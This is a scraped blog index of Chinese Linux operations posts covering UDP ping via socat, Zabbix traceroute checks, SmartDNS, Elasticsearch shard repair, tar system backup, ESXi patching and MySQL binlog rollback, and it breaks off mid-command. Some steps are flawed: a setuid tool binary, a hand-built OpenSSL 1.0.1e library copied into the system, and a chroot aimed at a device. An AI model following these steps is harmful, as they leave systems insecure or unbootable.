--dport 12213 -j ACCEPT iptables -A OUTPUT -p udp --sport 12213 -j ACCEPT (3) 配置udp响应服务 cat /etc/systemd/system/udpping.service 123456789[Unit]Description&#x3D;UDP Ping[Service]ExecStart&#x3D;&#x2F;usr&#x2F;bin&#x2F;socat UDP-LISTEN:12213,fork PIPERestart&#x3D;always[Install]WantedBy&#x3D;multi-user.target 1234systemctl enable udppingsystemctl start udppingsystemctl status udppingnetstat -lntup|grep 12213 客户端使用(1) Git Clone项目 ​ 项目地址：UDPping (2) 使用 1234567891011[root@localhost ~]# &#x2F;opt&#x2F;UDPping-master&#x2F;udpping.py xx.xx.xx.xx 12213UDPping 45.76.47.218 via port 12213 with 64 bytes of payloadReply from xx.xx.xx.xx seq&#x3D;0 time&#x3D;224.34 msReply from xx.xx.xx.xx seq&#x3D;1 time&#x3D;223.00 msReply from xx.xx.xx.xx seq&#x3D;2 time&#x3D;220.25 msReply from xx.xx.xx.xx seq&#x3D;3 time&#x3D;221.82 msReply from xx.xx.xx.xx seq&#x3D;4 time&#x3D;220.44 ms--- ping statistics ---5 packets transmitted, 5 received, 0.00% packet lossrtt min&#x2F;avg&#x2F;max &#x3D; 220.25&#x2F;221.97&#x2F;224.34 ms","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"UDP","slug":"UDP","permalink":"https://garywu520.github.io/tags/UDP/"},{"name":"UDP Ping","slug":"UDP-Ping","permalink":"https://garywu520.github.io/tags/UDP-Ping/"},{"name":"Ping","slug":"Ping","permalink":"https://garywu520.github.io/tags/Ping/"},{"name":"socat","slug":"socat","permalink":"https://garywu520.github.io/tags/socat/"}]},{"title":"zabbix监控TraceRoute数据","slug":"zabbix监控TraceRoute数据","date":"2019-05-31T03:11:28.000Z","updated":"2019-05-31T03:26:54.535Z","comments":true,"path":"2019/05/31/zabbix监控TraceRoute数据/","link":"","permalink":"https://garywu520.github.io/2019/05/31/zabbix%E7%9B%91%E6%8E%A7TraceRoute%E6%95%B0%E6%8D%AE/","excerpt":"zabbix监控TraceRoute数据1Trace工具：BestTrace 【MTR同理】 前言 12345678zabbix监控traceroute数据是由zabbix server端向“目标主机”发起的traceroute为了测试多个机房之间的网络情况，通常这个目标主机应该是不同机房的proxy端的代理因此，假设zabbix server为A机房，proxy分别为B机房和C机房，那么监控流向如下：A ---traceroute---&gt;BA ---traceroute---&gt;C因此，就会出现一个问题：即假设A--&gt;B 的traceroute出现问题，并不能一定说明，B有问题，也不能说明A一定有问题。此时就需要在不同的proxy端，通过脚本向其他两个不同机房进行反Traceroute,这样就有了数据对比，方便的确定具体是哪个机房网络出现故障。","text":"zabbix监控TraceRoute数据1Trace工具：BestTrace 【MTR同理】 前言 12345678zabbix监控traceroute数据是由zabbix server端向“目标主机”发起的traceroute为了测试多个机房之间的网络情况，通常这个目标主机应该是不同机房的proxy端的代理因此，假设zabbix server为A机房，proxy分别为B机房和C机房，那么监控流向如下：A ---traceroute---&gt;BA ---traceroute---&gt;C因此，就会出现一个问题：即假设A--&gt;B 的traceroute出现问题，并不能一定说明，B有问题，也不能说明A一定有问题。此时就需要在不同的proxy端，通过脚本向其他两个不同机房进行反Traceroute,这样就有了数据对比，方便的确定具体是哪个机房网络出现故障。 (1)在zabbix server服务器上安装besttrace1234567wget http:&#x2F;&#x2F;cdn.ipip.net&#x2F;17mon&#x2F;besttrace4linux.zipunzip besttrace4linux.zipchmod +x besttracemv besttrace &#x2F;usr&#x2F;sbin&#x2F;#让zabbix有权限执行besttrace命令chmod +s &#x2F;usr&#x2F;sbin&#x2F;besttrace (2)编写脚本1查看zabbix server服务器配置文件中的外部脚本路径，如：&#x2F;var&#x2F;lib&#x2F;zabbix&#x2F;externalscripts 1cd &#x2F;var&#x2F;lib&#x2F;zabbix&#x2F;externalscripts cat besttrace.sh 1234#!&#x2F;usr&#x2F;bin&#x2F;env bashIP&#x3D;$1&#x2F;usr&#x2F;sbin&#x2F;besttrace -q 1 $IP 修改脚本权限 12chmod +x besttrace.shchown zabbix:zabbix besttrace.sh (3) zabbix web添加自定义模板模板中创建监控项 123456Name: BestTraceType: External checkKey: besttrace.sh[&quot;&#123;HOST.IP&#125;&quot;]Type of information: Text时间间隔：90应用集：BestTrace (4) 将主机应用模板1稍等片刻，查看主机最新数据即可。 参考：Jérémy Verda’s IT Blog","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"zabbix","slug":"zabbix","permalink":"https://garywu520.github.io/tags/zabbix/"},{"name":"MTR","slug":"MTR","permalink":"https://garywu520.github.io/tags/MTR/"},{"name":"traceroute","slug":"traceroute","permalink":"https://garywu520.github.io/tags/traceroute/"},{"name":"besttrace","slug":"besttrace","permalink":"https://garywu520.github.io/tags/besttrace/"}]},{"title":"递归缓存DNS-SmartDNS","slug":"递归缓存DNS-SmartDNS","date":"2019-04-23T03:09:54.000Z","updated":"2019-04-23T03:13:27.040Z","comments":true,"path":"2019/04/23/递归缓存DNS-SmartDNS/","link":"","permalink":"https://garywu520.github.io/2019/04/23/%E9%80%92%E5%BD%92%E7%BC%93%E5%AD%98DNS-SmartDNS/","excerpt":"闲来无事，注意到一个个人DNS项目，拿来玩玩 SmartDNSgithub项目：SmartDNS github releases: SmartDNS","text":"闲来无事，注意到一个个人DNS项目，拿来玩玩 SmartDNSgithub项目：SmartDNS github releases: SmartDNS x86_64安装1234tar zxf smartdns.xxxxxxxx.x86-64.tar.gzcd smartdnschmod +x .&#x2F;install.&#x2F;install -i 配置参数参考：SmartDNS配置参数 grep -v ‘#’ /etc/smartdns/smartdns.conf 1234567891011121314151617181920212223server-name smartdnsconf-file /etc/smartdns/conf.d/*.confbind 10.0.10.101:53tcp-idle-time 120cache-size 512prefetch-domain yesforce-AAAA-SOA yesrr-ttl 300rr-ttl-min 60rr-ttl-max 600log-level errorlog-file /var/log/smartdns.loglog-size 128klog-num 5audit-enable yesaudit-file /var/log/smartdns-audit.log #解析日志存放目录audit-size 128k #解析日志大小audit-num 2 #解析日志存档数量#上级DNSserver-tls 8.8.8.8 -blacklist-ip -check-edns -group tlsserver-tls 1.0.0.1 -blacklist-ip -check-edns -group tlsserver-https https://cloudflare-dns.com/dns-query -blacklist-ip -check-edns -group https 启动服务12systemctl enable smartdnssystemctl start smartdns 启动错误解决12# smartdns --helpsmartdns: error while loading shared libraries: libssl.so.1.0.0: cannot open shared object file: No such file or directory 解决方法 123456yum install zlib-develwget https://www.openssl.org/source/old/1.0.1/openssl-1.0.1e.tar.gzcd openssl-1.0.1e./config shared zlib-dynamic #生成Makefile文件。make #生成生成libssl.so.1.0.0和libcrypto.so.1.0.0cp libssl.so.1.0.0 libcrypto.so.1.0.0 /usr/lib64/ FAQ高级配置：参考 SmartDNS压测结果 系统CentOS7 工具：queryperf 查询量级：5,505,024 查询成功率：5,505,024 每分钟执行次数：36966.632492-46034.007736 qps 总耗费时间：1m59.590s - 2m28.922s 整体来讲，压测结果还算可以，作为公司内部缓存DNS足矣，稳定性仍需测试","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"DNS","slug":"DNS","permalink":"https://garywu520.github.io/tags/DNS/"},{"name":"dig","slug":"dig","permalink":"https://garywu520.github.io/tags/dig/"},{"name":"queryperf","slug":"queryperf","permalink":"https://garywu520.github.io/tags/queryperf/"}]},{"title":"ES集群监控-总结","slug":"ES集群监控-总结","date":"2019-04-18T03:33:07.000Z","updated":"2019-04-19T02:14:53.950Z","comments":true,"path":"2019/04/18/ES集群监控-总结/","link":"","permalink":"https://garywu520.github.io/2019/04/18/ES%E9%9B%86%E7%BE%A4%E7%9B%91%E6%8E%A7-%E6%80%BB%E7%BB%93/","excerpt":"ES监控的最主要作用是用于保障基于ES的服务正常运行以及在出现问题时为工程师提供解决问题的依据，进而快速定位及解决问题","text":"ES监控的最主要作用是用于保障基于ES的服务正常运行以及在出现问题时为工程师提供解决问题的依据，进而快速定位及解决问题 集群监控集群监控主要包括2个方面的内容，分别是：集群健康状态 和 集群统计信息 ① 集群健康状态信息-API获取：1curl -XGET http://ip:9200/_cluster/health?pretty 1234567891011121314151617&#123; &quot;cluster_name&quot; : &quot;xxxxxx&quot;, &quot;status&quot; : &quot;green&quot;, &quot;timed_out&quot; : false, &quot;number_of_nodes&quot; : 8, &quot;number_of_data_nodes&quot; : 8, &quot;active_primary_shards&quot; : 12169, &quot;active_shards&quot; : 24338, &quot;relocating_shards&quot; : 0, &quot;initializing_shards&quot; : 0, &quot;unassigned_shards&quot; : 0, &quot;delayed_unassigned_shards&quot; : 0, &quot;number_of_pending_tasks&quot; : 0, &quot;number_of_in_flight_fetch&quot; : 0, &quot;task_max_waiting_in_queue_millis&quot; : 0, &quot;active_shards_percent_as_number&quot; : 100.0&#125; 指标 说明 status 集群状态：green、yellow和red number_of_nodes / number_of_data_nodes 集群节点数 / 数据节点数 active_primary_shards 集群中所有活跃的主分片数 active_shards 集群中所有活跃的分片数 relocating_shards 当前节点迁往其他节点的分片数量,通常为0. 当有节点加入或退出时该值会增加 initializing_shards 正在初始化的分片 unassigned_shards 未分配的分片数，通常为0；当有某个节点的副本分片丢失该值就会增加 number_of_pending_tasks 指主节点创建索引并分配shards等任务，如果该指标数值一直未减小代表集群存在不稳定因素 active_shards_percent_as_number 集群分片健康度； 活跃分片数占总分片数的比例 status 说明 green 所有的分片和副本均已分配，集群100%可用 yellow 所有的主分片正常，但至少有一个副本缺失，此时搜索结果依然是完整的，数据不会丢失。但高可用集群在某种程度上被弱化。 red 至少一个主分片(以及它的全部副本)都已经缺失，这意味着集群存在数据缺失，搜索只能返回部分数据，而分配到这个分片上的写入请求会返回异常 ② 集群统计信息-API获取集群统计信息包含：文档数、分片数、资源使用情况等 1curl -XGET http://ip:9200/_cluster/stats?pretty 指标 说明 indices.count 索引总数 indices.shards.total 分片总数 ubduces.shards.primaries 主分片数量 docs.count 文档总数 store.size_in_bytes 数据总存储容量 segments.count 段总数 nodes.count.total 总节点数 nodes.count.data 数据节点数 nodes.process.cpu.percent 节点CPU使用率 fs.total_in_bytes 文件系统使用总容量 fs.free_in_bytes 文件系统剩余总容量 在运行 Elasticsearch 时，内存是您要密切监控的关键资源之一。 Elasticsearch 和 Lucene 以两种方式利用节点上的所有可用 RAM：JVM heap 和文件系统缓存。 Elasticsearch 运行在Java虚拟机（JVM）中，这意味着JVM垃圾回收的持续时间和频率将成为其他重要的监控领域。 所以，仍需关注内存/CPU使用，指标值为： ① nodes.mem.used_percent ② nodes.process.cpu.percent ③ nodes.jvm.mem.heap_used","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://garywu520.github.io/tags/elasticsearch/"},{"name":"es","slug":"es","permalink":"https://garywu520.github.io/tags/es/"},{"name":"elk","slug":"elk","permalink":"https://garywu520.github.io/tags/elk/"},{"name":"es集群","slug":"es集群","permalink":"https://garywu520.github.io/tags/es%E9%9B%86%E7%BE%A4/"},{"name":"zabbix监控","slug":"zabbix监控","permalink":"https://garywu520.github.io/tags/zabbix%E7%9B%91%E6%8E%A7/"}]},{"title":"解决ES集群存在UNASSIGNED的问题","slug":"解决ES集群存在UNASSIGNED的问题","date":"2019-04-12T23:48:40.000Z","updated":"2019-04-13T00:27:38.003Z","comments":true,"path":"2019/04/13/解决ES集群存在UNASSIGNED的问题/","link":"","permalink":"https://garywu520.github.io/2019/04/13/%E8%A7%A3%E5%86%B3ES%E9%9B%86%E7%BE%A4%E5%AD%98%E5%9C%A8UNASSIGNED%E7%9A%84%E9%97%AE%E9%A2%98/","excerpt":"当ES集群出现red或yellow状态的时候，出现大量的UNASSIGNED未注册分片解决方案 确保集群正常 服务正常启动 9200端口正常监听","text":"当ES集群出现red或yellow状态的时候，出现大量的UNASSIGNED未注册分片解决方案 确保集群正常 服务正常启动 9200端口正常监听 查看ES集群状态1curl -XGET &#x27;http://localhost:9200/_cluster/health?pretty&#x27; 123456789101112131415161718[root@lfh-R720-51 ~]# curl -XGET &#x27;http://server_ip:9200/_cluster/health?pretty&#x27;&#123; &quot;cluster_name&quot; : &quot;cluster&quot;, &quot;status&quot; : &quot;red&quot;, #ES集群当前状态为red,表示不正常 &quot;timed_out&quot; : false, &quot;number_of_nodes&quot; : 8, &quot;number_of_data_nodes&quot; : 8, &quot;active_primary_shards&quot; : 12097, &quot;active_shards&quot; : 24194, &quot;relocating_shards&quot; : 2, &quot;initializing_shards&quot; : 0, &quot;unassigned_shards&quot; : 6, #这里显示未注册分片数量 &quot;delayed_unassigned_shards&quot; : 0, &quot;number_of_pending_tasks&quot; : 305989, &quot;number_of_in_flight_fetch&quot; : 0, &quot;task_max_waiting_in_queue_millis&quot; : 417944, &quot;active_shards_percent_as_number&quot; : 100.0&#125; 查看unassigned(未注册)分片信息1curl -XGET &#x27;http://server_ip:9200/_cat/shards&#x27; | grep UNASSIGNED 12345 索引名称 shard序号 状态：未注册logstash-exc-crash-2018.04.30 3 p UNASSIGNED logstash-exc-crash-2018.02.28 1 p UNASSIGNED logstash-exc-crash-2018.02.28 1 r UNASSIGNED logstash-exc-crash-2018.02.20 1 p UNASSIGNED 获取ES集群或单一节点唯一标识这个唯一标识，在稍后处理shards时要用到 1curl -XGET &#x27;http://server_ip:9200/_nodes/stats?pretty&#x27;|head 123456一般类似：nodes&quot; : &#123;4 &quot;02Bp5yXsQVO2BlUgYViYvt&quot; : &#123;9 &quot;timestamp&quot; : 1555114009778,注：这里的&quot;02Bp5yXsQVO2BlUgYViYvt&quot; 就是唯一标识了 处理unassigned分片信息(1) 如果列出的unassigned分片信息，数据较老，并且可以接受索引删除，那么直接使用命令删除掉就可以了 1curl -XDELETE &#x27;http://server_ip:9200/logstash-exc-crash-2018.02.28&#x27; 正常的情况下，删除后会返回true (2)[推荐] 如果数据较新，不容忍数据丢失，那么就需要强制reroute 1234567891011curl -XPOST &#x27;server_ip:9200/_cluster/reroute&#x27; -d &#x27;&#123; &quot;commands&quot; : [ &#123; &quot;allocate&quot; : &#123; &quot;index&quot; : &quot;logstash-exc-crash-2018.04.30&quot;, &quot;shard&quot; : 3, &quot;node&quot; : &quot;02Bp5yXsQVO2BlUgYViYvt&quot;, &quot;allow_primary&quot; : true &#125; &#125; ] &#125;&#x27; 其中，index代表索引名称；shard代表shard分片序号；node代表的是集群或节点唯一标识 再次验证集群待我们手动循环执行以上脚本，处理未注册的shard信息后，再次验证集群的状态，同样输入命令”curl -XGET ‘http://server_ip:9200/_cluster/health?pretty&#39;&quot;,查看集群状态，可以看到集群状态已经为green了。 1curl -XGET &#x27;http://server_ip:9200/_cluster/health?pretty&#x27; 1234567891011121314151617&#123; &quot;cluster_name&quot; : &quot;cluster&quot;, &quot;status&quot; : &quot;green&quot;, #集群状态green &quot;timed_out&quot; : false, &quot;number_of_nodes&quot; : 8, &quot;number_of_data_nodes&quot; : 8, &quot;active_primary_shards&quot; : 12101, &quot;active_shards&quot; : 24202, &quot;relocating_shards&quot; : 2, &quot;initializing_shards&quot; : 0, &quot;unassigned_shards&quot; : 0, #未注册的分片已经成了0 &quot;delayed_unassigned_shards&quot; : 0, &quot;number_of_pending_tasks&quot; : 2030465, &quot;number_of_in_flight_fetch&quot; : 0, &quot;task_max_waiting_in_queue_millis&quot; : 2880496, &quot;active_shards_percent_as_number&quot; : 100.0&#125;","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"https://garywu520.github.io/tags/elasticsearch/"},{"name":"ES","slug":"ES","permalink":"https://garywu520.github.io/tags/ES/"},{"name":"ES分片","slug":"ES分片","permalink":"https://garywu520.github.io/tags/ES%E5%88%86%E7%89%87/"},{"name":"shards","slug":"shards","permalink":"https://garywu520.github.io/tags/shards/"},{"name":"unassigned shards","slug":"unassigned-shards","permalink":"https://garywu520.github.io/tags/unassigned-shards/"}]},{"title":"linux通用系统备份与恢复","slug":"linux通用系统备份与恢复","date":"2019-04-10T09:38:11.000Z","updated":"2019-04-17T00:12:14.109Z","comments":true,"path":"2019/04/10/linux通用系统备份与恢复/","link":"","permalink":"https://garywu520.github.io/2019/04/10/linux%E9%80%9A%E7%94%A8%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/","excerpt":"适用场景 Linux系统备份与恢复使用dd命令将整块磁盘拷贝与恢复就可以快速的启动操作系统。但有个问题是：如果之前的磁盘有逻辑坏道怎么办？这样一来，dd恢复后的操作系统也大几率存在逻辑坏道的问题。 基于此，本文章详细介绍如何使用tar来备份与还原系统。 准备环境 boot分区为独立分区 这里备份恢复的系统所使用的boot分区，均为独立分区，大小200M 对应linux发行版的livecd 这里是Gentoo系统，故这里下载 install-amd64-minimal-20170302.iso 移动硬盘 tar压缩后，将压缩文件放到移动硬盘中","text":"适用场景 Linux系统备份与恢复使用dd命令将整块磁盘拷贝与恢复就可以快速的启动操作系统。但有个问题是：如果之前的磁盘有逻辑坏道怎么办？这样一来，dd恢复后的操作系统也大几率存在逻辑坏道的问题。 基于此，本文章详细介绍如何使用tar来备份与还原系统。 准备环境 boot分区为独立分区 这里备份恢复的系统所使用的boot分区，均为独立分区，大小200M 对应linux发行版的livecd 这里是Gentoo系统，故这里下载 install-amd64-minimal-20170302.iso 移动硬盘 tar压缩后，将压缩文件放到移动硬盘中 备份linux系统1. 启动livecd系统2. 查看硬盘分区情况，确定要备份的分区，这里是sda11fdisk -l /dev/sda 3. 挂载sda1和boot分区1234567mkdir /mnt/sda3 /mnt/bootmount /dev/sda1 /mnt/bootmount /dev/sda3 /mnt/sda3cd /mnt/boot &amp;&amp; lscd /mnt/sda3 &amp;&amp; ls#查看要备份的系统根目录，如果有其他的分区需要挂载备份，同理挂载即可。 1234mkdir /mnt/sdcmount /dev/sdc /mnt/sdc#挂载准备的移动硬盘 4. 打包备份1234567cd /mnt/sda3tar cvpfz /mnt/sdc/backup.tgz ./ du -sh /mnt/sdc/backup.tgzcd /mnt/boottar cvpfz /mnt/sdc/boot.tgz ./du -sh tar cvpfz /mnt/sdc/boot.tgz cvpfz 意思是“创建档案文件”、保留所有东西原来的权限以及使用gzip来减小文件尺寸。打包后放到移动硬盘的/mnt/sdc1目录, 使用du命令来查看大小。 5. 卸载掉移动硬盘挂载1umount /mnt/sdc linux系统还原现在就可以拿着移动硬盘的tgz压缩的系统，去还原到其他机器了 1. 启动livecd2. 给新服务器分区并格式化1234567891011# 这里使用fdisk给系统分区，注:第一个分区应预留2048k的空间fdisk /dev/sdao #初始化dos格式p #查看分区n #创建分区 p #创建主分区 2048 +200M #创建独立boot分区 ... +8G #创建swap分区 ... +50G #创建根分区 ... ... #剩余给数据分区最后输入w保存分区 12345#格式化分区mkfs.reiserfs #格式化boot分区mkswap /dev/sda2 #格式化swapmkfs.reiserfs /dev/sda3 #格式化根分区mkfs.reiserfs /dev/sda4 #格式化数据分区 3. 挂载分区1234mkdir -p /mnt/sda1 /mnt/sda3 /mnt/sdbc mount /dev/sda1 /mnt/sda1 #临时挂载boot分区，用于恢复数据文件mount /dev/sda3 /mnt/sda3 #挂载根分区mount /dev/sdc /mnt/sdc #挂载移动硬盘 4.解压tar包 12tar xvpfz /mnt/sdc/backup.tgz -C /mnt/sda3 #解压备份文件到根分区tar xvpfz /mnt/sdc/boot.tgz -C /mnt/sda1 #解压boot文件到boot分区 5.重新挂载boot分区，安装grub到mbr 1234cd /mnt/sda3/boot/ #查看此目录是否有文件，有的话临时移走umount /mnt/sda1 #卸载boot分区挂载mount /dev/sda1 /mnt/sda3/boot #注意：重新把boot分区挂载到系统下的boot目录，这是chroot安装grub时的默认位置.即: /boot 123chroot /dev/sda3 #chroot到根分区grub2-install /dev/sda #安装引导grub2-mkconfig -o /boot/grub/grub.cfg #重新生成配置文件 注意1如果系统版本较老，可能使用的是grub-install，而非grub2-install,故需要使用如下方法安装引导 1234chroot /dev/sda3 #chroot到根分区df -hmount /dev/sda1 /boot #chroot后挂载/dev/sda1分区到/bootgrub-install /dev/sda #安装引导 6. 修改fatab和grub修改fatab 1将/etc/fstab文件，更正现有挂载信息 确认/boot/grub/grub.conf文件是否正确 12345678910cat /boot/grub/grub.confdefault 0timeout 30title Gentoo Linux 3.5.7-gentooroot (hd0,0)#hd0,hd1,hd2,hd3对应sda,sdb,sdc,sdd依此类推kernel /boot/kernel-genkernel-x86_64-3.5.7-gentoo root=/dev/sda3 #这里kernel路径要正确，并且root要与根分区对应initrd /boot/initramfs-genkernel-x86_64-3.5.7-gentoo 7.重启机器确认系统能正确引导 8. 修复网络系统还原后，进入系统，发现网卡不能启动，原因是 /etc/udev/rules.d/70-persistent-net.rules文件在捣鬼，mv成其他名字，重启系统后，系统会自动生成此文件，这时候网卡就可以正常启动了。 如果还不能解决问题，需要检测下网卡模块是否已经加载：lsmod |grep e1000 参考：Gentoo Linux","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"linux","slug":"linux","permalink":"https://garywu520.github.io/tags/linux/"},{"name":"系统备份","slug":"系统备份","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E5%A4%87%E4%BB%BD/"},{"name":"系统恢复","slug":"系统恢复","permalink":"https://garywu520.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%81%A2%E5%A4%8D/"}]},{"title":"ESXI6.7-Path补丁在线升级","slug":"ESXI6-7-Path补丁在线升级","date":"2019-04-03T06:58:45.000Z","updated":"2019-04-03T09:54:53.985Z","comments":true,"path":"2019/04/03/ESXI6-7-Path补丁在线升级/","link":"","permalink":"https://garywu520.github.io/2019/04/03/ESXI6-7-Path%E8%A1%A5%E4%B8%81%E5%9C%A8%E7%BA%BF%E5%8D%87%E7%BA%A7/","excerpt":"查看当前ESXI6.7内部版本号VMware ESXI Web —-&gt; 帮助 —&gt; 关于","text":"查看当前ESXI6.7内部版本号VMware ESXI Web —-&gt; 帮助 —&gt; 关于 升级ESXI补丁 Web UI启用SSH服务，并登录 ESXI6.7各内部版本升级列表： ESXI-6.5.0-Path补丁 ESXI-6.7.0-Path补丁 ​ 点击比当前版本号新的版本,如： ESXi-6.7.0-20180704001-standard 即可看到升级说明，如下： 1234567891011# Cut and paste these commands into an ESXi shell to update your host with this Imageprofile# See the Help page for more instructionsshell&gt; esxcli network firewall ruleset set -e true -r httpClientshell&gt; esxcli software profile update -p ESXi-6.7.0-20180704001-standard \\-d https://hostupdate.vmware.com/software/VUM/PRODUCTION/main/vmw-depot-index.xmlshell&gt; esxcli network firewall ruleset set -e false -r httpClient# Reboot to complete the upgrade 照做就是了，最后需要重启ESXI物理服务器来完成最新更新。 注：升级时，可以直接选择最新Build版本进行在线更新","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ESXI PATH","slug":"ESXI-PATH","permalink":"https://garywu520.github.io/tags/ESXI-PATH/"},{"name":"ESXI补丁升级","slug":"ESXI补丁升级","permalink":"https://garywu520.github.io/tags/ESXI%E8%A1%A5%E4%B8%81%E5%8D%87%E7%BA%A7/"},{"name":"ESXI6.7","slug":"ESXI6-7","permalink":"https://garywu520.github.io/tags/ESXI6-7/"}]},{"title":"binlog2sql之MySQL数据闪回实战","slug":"binlog2sql之MySQL快速恢复实战","date":"2019-04-03T03:04:23.000Z","updated":"2019-04-04T07:36:13.465Z","comments":true,"path":"2019/04/03/binlog2sql之MySQL快速恢复实战/","link":"","permalink":"https://garywu520.github.io/2019/04/03/binlog2sql%E4%B9%8BMySQL%E5%BF%AB%E9%80%9F%E6%81%A2%E5%A4%8D%E5%AE%9E%E6%88%98/","excerpt":"MySQL闪回特性最早由阿里彭立勋开发，彭在2012年给官方提交了一个patch，并对闪回设计思路做了说明。但是因为种种原因，业内安装这个patch的团队至今还是少数，真正应用到线上的更是少之又少。 而binlog2sql则是借鉴的这种思路，它由美团点评DBA团队(上海)出品，多次在线上环境做快速回滚。 适用场景某天，同事A误删了大批线上用户MySQL表的数据…… 他急忙找到公司DBA请求帮助，“客服电话已被打爆，大量用户投诉无法登陆，领导非常恼火。请问多久能恢复数据？”DBA一脸懵逼，沉默十秒后，伸出一根手指。“你的意思是一分钟就能恢复？太好了。”小明终于有些放松，露出了一丝笑容。“不，我们中有个人将会离开公司……” DBA沉痛的说道。 参考：GitHub MySQL闪回","text":"MySQL闪回特性最早由阿里彭立勋开发，彭在2012年给官方提交了一个patch，并对闪回设计思路做了说明。但是因为种种原因，业内安装这个patch的团队至今还是少数，真正应用到线上的更是少之又少。 而binlog2sql则是借鉴的这种思路，它由美团点评DBA团队(上海)出品，多次在线上环境做快速回滚。 适用场景某天，同事A误删了大批线上用户MySQL表的数据…… 他急忙找到公司DBA请求帮助，“客服电话已被打爆，大量用户投诉无法登陆，领导非常恼火。请问多久能恢复数据？”DBA一脸懵逼，沉默十秒后，伸出一根手指。“你的意思是一分钟就能恢复？太好了。”小明终于有些放松，露出了一丝笑容。“不，我们中有个人将会离开公司……” DBA沉痛的说道。 参考：GitHub MySQL闪回 MySQL binlog概述(1) MySQL binlog已event的形式，记录了MySQL Server从启用binlog以来所有的变更信息，能够帮助重现这之间的所有变化。 (2) MySQL 引入binlog主要有两个目的： 为了主从复制 某些备份还原操作后需要重新应用binlog (3) binlog格式共分为3种，各有优缺点: statement: 基于SQL语句的模式，binlog数据量小，但是某些语句和函数在复制过程中可能导致数据不一致，甚至报错。 row: 基于行的模式，记录的是行的完整变化。很安全，但是binlog文件会比其他两种模式大很多。 mixed: 混合模式，根据语句来选用是statement还是row模式。 MySQL binlog闪回原理利用binlog闪回，需要将binlog格式设置为row 既然binlog以event的形式记录了所有变更的信息，那么我们需要回滚event事务，从后往前回滚即可。 单个event的回滚原理这里以表test.user来演示原理，同时需要使用binlog2sql将原始binlog转化成可读SQL 12345678mysql&gt; show create table test.user\\G*************************** 1. row *************************** Table: userCreate Table: CREATE TABLE &#96;user&#96; ( &#96;id&#96; int(11) NOT NULL AUTO_INCREMENT, &#96;name&#96; varchar(10) DEFAULT NULL, PRIMARY KEY (&#96;id&#96;)) ENGINE&#x3D;InnoDB AUTO_INCREMENT&#x3D;6 DEFAULT CHARSET&#x3D;utf8 对于delete操作，我们从binlog提取出delete信息，生成回滚语句的insert。 12原始：DELETE FROM &#96;test&#96;.&#96;user&#96; WHERE &#96;id&#96;&#x3D;1 AND &#96;name&#96;&#x3D;&#39;小赵&#39;;回滚：INSERT INTO &#96;test&#96;.&#96;user&#96;(&#96;id&#96;, &#96;name&#96;) VALUES (1, &#39;小赵&#39;); 对于insert操作，回滚SQL是delete 12原始：INSERT INTO &#96;test&#96;.&#96;user&#96;(&#96;id&#96;, &#96;name&#96;) VALUES (2, &#39;小钱&#39;);回滚：DELETE FROM &#96;test&#96;.&#96;user&#96; WHERE &#96;id&#96;&#x3D;2 AND &#96;name&#96;&#x3D;&#39;小钱&#39;; 对于update操作，回滚SQL应该交换SET和WHERE的值 12原始：UPDATE &#96;test&#96;.&#96;user&#96; SET &#96;id&#96;&#x3D;3, &#96;name&#96;&#x3D;&#39;小李&#39; WHERE &#96;id&#96;&#x3D;3 AND &#96;name&#96;&#x3D;&#39;小孙&#39;;回滚：UPDATE &#96;test&#96;.&#96;user&#96; SET &#96;id&#96;&#x3D;3, &#96;name&#96;&#x3D;&#39;小孙&#39; WHERE &#96;id&#96;&#x3D;3 AND &#96;name&#96;&#x3D;&#39;小李&#39;; MySQL数据闪回实战 真实的闪回场景中，最关键的是能快速筛选出真正需要回滚的SQL 安装binlog2sql，参考：binlog分析工具之binlog2sql 背景同事A，在11:44时误删了test库bigdata表的大批数据，需要紧急回滚。 12345678#test库bigdata表原有数据mysql&gt; select * from bigdata;+----------+------------------+-------------+---------+---------------------+| class_id | class_name | class_month | teacher | last_mod_ts |+----------+------------------+------------+----------+---------------------+| 1 | bigdata intro. | 8 | Mars | 2019-04-04 10:41:42 || 2 | hadoop intro. | 8 | Mars | 2019-04-04 10:41:42 | 1234567891011# 同事A在下午2019-04-04 14:47左右删除了表中大部分数据，此时，正常业务数据是在继续写入的。mysql&gt; delete from bigdata where last_mod_ts &gt;&#39;2019-04-04 10:45:00&#39;;Query OK, 2 rows affected (0.07 sec)mysql&gt; select count(*) from bigdata;+----------+| count(*) |+----------+| 18 |+----------+1 row in set (0.00 sec) 恢复数据步骤 登陆mysql，查看目前的binlog文件 12345678mysql&gt; show master logs;+------------------+-----------+| Log_name | File_size |+------------------+-----------+| mysql-bin.000001 | 177 || mysql-bin.000002 | 6763 |+------------------+-----------+2 rows in set (0.00 sec) 可以看到，最新的binlog文件是 mysql-bin.000002。我们的目标是筛选出需要回滚的SQL。 由于同事A只知道大致误操作的时间，故首先根据时间做一次过滤，只需要解析test库bigdata表。 注：如果涉及多个sql误操作，则生成的binlog可能分布在多个文件，需解析多个文件 解析binlog为标准SQL 1# python binlog2sql/binlog2sql.py -h127.0.0.1 -uroot -p -P3306 -dtest -tbigdata --start-file=&#x27;mysql-bin.000002&#x27; --start-datetime=&#x27;2019-04-04 